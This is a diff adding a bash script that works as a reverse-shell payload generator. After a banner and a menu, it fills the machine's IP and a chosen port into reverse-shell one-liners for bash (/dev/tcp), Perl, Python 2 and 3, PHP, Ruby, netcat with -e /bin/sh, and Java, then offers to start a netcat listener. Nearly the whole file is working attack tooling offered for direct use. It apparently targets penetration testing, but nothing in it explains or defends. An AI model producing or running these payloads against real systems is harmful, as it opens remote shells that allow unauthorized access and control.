@@ -1,0 +1,223 @@
+#!/bin/bash
+
+
+################### 
+#====================
+#author: m3rc
+#github: https://github.com/Im3rc
+#====================
+###################
+
+
+
+
+#Deifing the colors 
+#--------------------
+
+RED='\033[0;31m'
+YELLOW='\033[0;33m'
+
+
+#Banner
+#--------------------
+
+echo -e ""
+echo -e "\e[31m-------------------------\n"
+echo -e "${YELLOW}\ \ / -_)  _|(_-<  _ \ \n \_/\___|_|  ___/\___/"
+echo -e "\n\e[31m-------------------------\e[0m"
+
+echo -e "\n"
+
+
+#Code
+#---------------------
+
+#Arguments 
+#---------------------
+
+IP=$(ip route get 8.8.8.8 | awk -F"src " 'NR==1{split($2,a," ");print a[1]}')
+
+if [ '$1' != "" ]; then
+        PORT=$1 
+fi
+[ $# -eq 0 ] && { echo -e "\e[1mUsage:\e[21m $0 \033[31m<PORT>\e[0m"; echo -e ""; exit 1; }
+
+function invoke_nc(){
+	echo -e ""
+	echo -en "\n\e[33m\e[1mLaunch netcat? y/n:\e[0m  "
+        read -n 1 line
+        echo -e ""
+        if [[ $line == 'y' ]]; then
+                echo -e "\n\e[1mnc \e[21mlistening on PORT:\e[32m $PORT\e[0m"
+                echo -e ""
+                nc -lnvp $PORT
+                else
+                echo -e ""
+                echo -e "\e[31mG00d By3e\e[0m\e[5m\e[32m!!!\e[25m\e[0m "
+                echo -e ""
+                exit
+        fi
+}
+
+function bash_revs(){
+	echo -e ""
+	echo -e "\e[1m\e[4mBASH Reverse Shell\e[24m\e[21m\n"
+	echo -e ""
+	echo -e "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+	echo -e "" 
+	invoke_nc 
+}
+
+
+function perl_revs(){
+	echo -e ""
+	echo -e "\e[1m\e[4mPERL Reverse Shell\e[24m\e[21m\n"
+	echo -e ""
+	echo -n $'perl -e\'use Socket;'
+	echo -n '$i="'
+	echo -n $IP
+	echo -n '";$p='
+	echo -n $PORT
+	echo -n ';socket(S,PF_INET,SOCK_STREAM,getprotobyname'
+	echo -n $'("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
+	echo -e ""
+	invoke_nc	
+}
+
+function python2_revs(){
+	echo -e ""
+	echo -e "\e[1m\e[4mPython-2 Reverse Shell\e[24m\e[21m\n"
+	echo -e "" 
+	echo -n $'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'
+	echo -n $IP
+	echo -n '",'
+	echo -n $PORT
+	echo -n $'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
+	echo -e ""
+	invoke_nc
+}
+
+function python3_revs(){
+	echo -e ""
+	echo -e "\e[1m\e[4mPython-3 Reverse Shell\e[24m\e[21m\n"
+	echo -e ""
+	echo -n $'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'
+	echo -n $IP
+	echo -n '",'
+	echo -n $PORT
+	echo -n $'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
+	echo -e ""
+	invoke_nc
+	
+}
+
+function php_revs(){
+	echo -e ""
+	echo -e "\e[1m\e[4mPHP Reverse Shell\e[24m\e[21m\n"
+	echo -e ""
+	echo -n $'php -r \'$sock=fsockopen("'
+	echo -n $IP
+	echo -n '",'
+	echo -n $PORT
+	echo -n $');exec("/bin/sh -i <&3 >&3 2>&3");\''
+	echo -e ""
+	invoke_nc
+}
+
+function ruby_revs(){
+	echo -e ""
+	echo -e "\e[1m\e[4mRUBY Reverse Shell\e[24m\e[21m\n"
+	echo -e ""
+	echo -n $'ruby -rsocket -e\'f=TCPSocket.open("'
+	echo -n $IP
+	echo -n '",'
+	echo -n $PORT
+	echo -n $').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
+	echo -e ""
+	invoke_nc
+}
+
+function nc_revs(){
+	echo -e ""
+	echo -e "\e[1m\e[4mnc Reverse Shell\e[24m\e[21m\n"
+	echo -e ""
+	echo -e "nc -e /bin/sh $IP $PORT"
+	echo -en "\nLaunch netcat? y/n\t"
+        read -n 1 line
+        echo -e ""
+        invoke_nc
+
+}
+
+function java_revs(){
+	echo -e ""
+	echo -e "\e[1m\e[4mJAVA Reverse Shell\e[24m\e[21m\n"
+	echo -e ""
+	echo "r = Runtime.getRuntime()"
+	echo -n 'p
+       	= r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'
+	echo -n $IP
+	echo -n '/'
+	echo -n $PORT
+	echo  ';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'
+	echo -e 'p.waitFor()'
+	echo -e ""
+	invoke_nc
+}
+
+function menu(){
+	
+	echo -e "\e[1m\e[4mReverse Shell Menu\e[24m\e[21m\n"
+	echo -e "\t\e[93m1.\e[0m Bash "
+	echo -e "\t\e[93m2.\e[0m Perl"
+	echo -e "\t\e[93m3.\e[0m Python2"
+	echo -e "\t\e[93m4.\e[0m Python3"
+	echo -e "\t\e[93m5.\e[0m PHP"
+	echo -e "\t\e[93m6.\e[0m Ruby"
+	echo -e "\t\e[93m7.\e[0m Netcat"
+	echo -e "\t\e[93m8.\e[0m Java"
+	echo -e "\t\e[93m0.\e[0m Exit \n\n"
+	echo -e "Enter an Option:\t "
+	read -n 1 option
+}
+
+while [ 1 ]
+do
+	menu
+	case $option in
+	0)
+	clear
+	break ;;
+	1)
+	bash_revs ;;
+
+	2)
+	perl_revs ;;
+
+	3)
+	python2_revs ;;
+	
+	4)
+	python3_revs ;;
+	
+	5)
+	php_revs ;;
+	
+	6)
+	ruby_revs ;;
+
+	7)
+	nc_revs ;;
+	
+	8)
+	java_revs ;;
+
+	*)
+	clear
+	echo -e "\n\t\e[5m\e[31m!!Wrong Selection!!\e[0m\e[25m\n"
+	;;
+	esac
+	
+
+done
+
